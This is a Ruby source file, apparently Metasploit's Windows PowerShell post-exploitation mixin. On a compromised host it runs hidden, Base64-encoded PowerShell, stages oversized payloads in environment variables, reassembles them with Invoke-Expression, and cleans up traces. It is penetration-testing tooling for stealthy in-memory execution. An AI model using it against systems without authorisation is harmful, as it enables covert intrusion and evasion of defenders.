# -*- coding: binary -*-
require 'msf/core/exploit/powershell'
require 'msf/core/post/common'

module Msf
class Post
module Windows

module Powershell
  include ::Msf::Exploit::Powershell
  include ::Msf::Post::Common

  def initialize(info = {})
    super
    register_advanced_options(
      [
        OptInt.new('PS_TIMEOUT',   [true, 'Powershell execution timeout', 30]),
        OptBool.new('PS_LOG_OUTPUT', [true, 'Write output to log file', false]),
        OptBool.new('PS_DRY_RUN', [true, 'Write output to log file', false]),
      ], self.class)
  end

  #
  # Returns true if powershell is installed
  #
 	def have_powershell?
 		cmd_out = cmd_exec("powershell get-host")
 		return true if cmd_out =~ /Name.*Version.*InstanceID/
 		return false
 	end

  #
  # Get/compare list of current PS processes - nested execution can spawn many children
  # doing checks before and after execution allows us to kill more children...
  # This is a hack, better solutions are welcome since this could kill user
  # spawned powershell windows created between comparisons.
  #
  def get_ps_pids(pids = [])
    current_pids = session.sys.process.get_processes.keep_if {|p|
      p['name'].downcase == 'powershell.exe'
    }.map {|p| p['pid']}
    # Subtract previously known pids
    current_pids = (current_pids - pids).uniq
    return current_pids
  end

  #
  # Execute a powershell script and return the output, channels, and pids. The script
  # is never written to disk.
  #
  def execute_script(script, greedy_kill = false)
    @session_pids ||= []
    running_pids = greedy_kill ? get_ps_pids : []
    open_channels = []
    # Execute using -EncodedCommand
    session.response_timeout = datastore['PS_TIMEOUT'].to_i
    ps_bin = datastore['RUN_WOW64'] ? '%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe' : 'powershell'
    cmd_out = session.sys.process.execute("#{ps_bin} -EncodedCommand " +
      "#{script}", nil, {'Hidden' => true, 'Channelized' => true}
    )

    # Subtract prior PIDs from current
    if greedy_kill
      Rex::ThreadSafe.sleep(3) # Let PS start child procs
      running_pids = get_ps_pids(running_pids)
    end

    # Add to list of running processes
    running_pids << cmd_out.pid

    # All pids start here, so store them in a class variable
    (@session_pids += running_pids).uniq!

    # Add to list of open channels
    open_channels << cmd_out

    return [cmd_out, running_pids.uniq, open_channels]
  end


  #
  # Powershell scripts that are longer than 8000 bytes are split into 8000
  # 8000 byte chunks and stored as environment variables. A new powershell
  # script is built that will reassemble the chunks and execute the script.
  # Returns the reassembly script.
  #
  def stage_to_env(compressed_script, env_suffix = Rex::Text.rand_text_alpha(8))

    # Check to ensure script is encoded and compressed
    if compressed_script =~ /\s|\.|\;/
      compressed_script = compress_script(compressed_script)
    end
    # Divide the encoded script into 8000 byte chunks and iterate
    index = 0
    count = 8000
    while (index < compressed_script.size - 1)
      # Define random, but serialized variable name
      env_prefix = "%05d" % ((index + 8000)/8000)
      env_variable = env_prefix + env_suffix

      # Create chunk
      chunk = compressed_script[index, count]

      # Build the set commands
      set_env_variable =  "[Environment]::SetEnvironmentVariable("
      set_env_variable += "'#{env_variable}',"
      set_env_variable += "'#{chunk}', 'User')"

      # Compress and encode the set command
      encoded_stager = compress_script(set_env_variable)

      # Stage the payload
      print_good(" - Bytes remaining: #{compressed_script.size - index}")
      cmd_out, running_pids, open_channels = execute_script(encoded_stager, false)
      # Increment index
      index += count

    end

    # Build the script reassembler
    reassemble_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
    reassemble_command += "Select-String #{env_suffix}|Sort-Object|%{"
    reassemble_command += "$c+=[Environment]::GetEnvironmentVariable($_,'User')"
    reassemble_command += "};Invoke-Expression $($([Text.Encoding]::Unicode."
    reassemble_command += "GetString($([Convert]::FromBase64String($c)))))"

    # Compress and encode the reassemble command
    encoded_script = compress_script(reassemble_command)

    return encoded_script
  end

  #
  # Reads output of the command channel and empties the buffer.
  # Will optionally log command output to disk.
  #
 	def get_ps_output(cmd_out, eof, read_wait = 5)

 		results = ''

    if datastore['PS_LOG_OUTPUT']
      # Get target's computer name
      computer_name = session.sys.config.sysinfo['Computer']

      # Create unique log directory
      log_dir = ::File.join(Msf::Config.log_directory,'scripts','powershell', computer_name)
      ::FileUtils.mkdir_p(log_dir)

      # Define log filename
      time_stamp  = ::Time.now.strftime('%Y%m%d:%H%M%S')
      log_file    = ::File.join(log_dir,"#{time_stamp}.txt")


      # Open log file for writing
      fd = ::File.new(log_file, 'w+')
    end

    # Read output until eof or nil return output and write to log
    while (1)
      line = ::Timeout.timeout(read_wait) {
        cmd_out.channel.read
      } rescue nil
      break if line.nil?
      if (line.sub!(/#{eof}/, ''))
        results << line
        fd.write(line) if fd
        vprint_good("\t#{line}")
        break
      end
      results << line
      fd.write(line) if fd
      vprint_good("\n#{line}")
    end

    # Close log file
    # cmd_out.channel.close()
    fd.close() if fd

    return results
  end

  #
  # Clean up powershell script including process and chunks stored in environment variables
  #
  def clean_up(
    script_file = nil,
    eof = '',
    running_pids =[],
    open_channels = [],
    env_suffix = Rex::Text.rand_text_alpha(8),
    delete = false
  )
    # Remove environment variables
    env_del_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
    env_del_command += "Select-String #{env_suffix}|%{"
    env_del_command += "[Environment]::SetEnvironmentVariable($_,$null,'User')}"

    script = compress_script(env_del_command, eof)
    cmd_out, new_running_pids, new_open_channels = execute_script(script)
    get_ps_output(cmd_out, eof)

    # Kill running processes
    (@session_pids + running_pids + new_running_pids).uniq!
    (running_pids + new_running_pids).each do |pid|
      session.sys.process.kill(pid)
    end


    # Close open channels
    (open_channels + new_open_channels).each do |chan|
      chan.channel.close
    end

    ::File.delete(script_file) if (script_file and delete)

    return
  end

  #
  # Simple script execution wrapper, performs all steps
  # required to execute a string of powershell.
  # This method will try to kill all powershell.exe PIDs
  # which appeared during its execution, set greedy_kill
  # to false if this is not desired.
  #
  def psh_exec(script, greedy_kill=true, ps_cleanup=true)
    # Define vars
    eof = Rex::Text.rand_text_alpha(8)
    env_suffix = Rex::Text.rand_text_alpha(8)
    # Check format
    if script =~ /\s|\.|\;/
      script = compress_script(script)
    end
    if datastore['PS_DRY_RUN']
      print_good("powershell -EncodedCommand #{script}")
      return
    else
      # Check 8k cmd buffer limit, stage if needed
      if (script.size > 8100)
        vprint_error("Compressed size: #{script.size}")
        error_msg =  "Compressed size may cause command to exceed "
        error_msg += "cmd.exe's 8kB character limit."
        vprint_error(error_msg)
        vprint_good('Launching stager:')
        script = stage_to_env(script, env_suffix)
        print_good("Payload successfully staged.")
      else
        print_good("Compressed size: #{script.size}")
      end
      # Execute the script, get the output, and kill the resulting PIDs
      cmd_out, running_pids, open_channels = execute_script(script, greedy_kill)
      ps_output = get_ps_output(cmd_out,eof,datastore['PS_TIMEOUT'])
      # Kill off the resulting processes if needed
      if ps_cleanup
        vprint_good( "Cleaning up #{running_pids.join(', ')}" )
        clean_up(nil, eof, running_pids, open_channels, env_suffix, false)
      end
      return ps_output
    end
  end

end
end
end
end

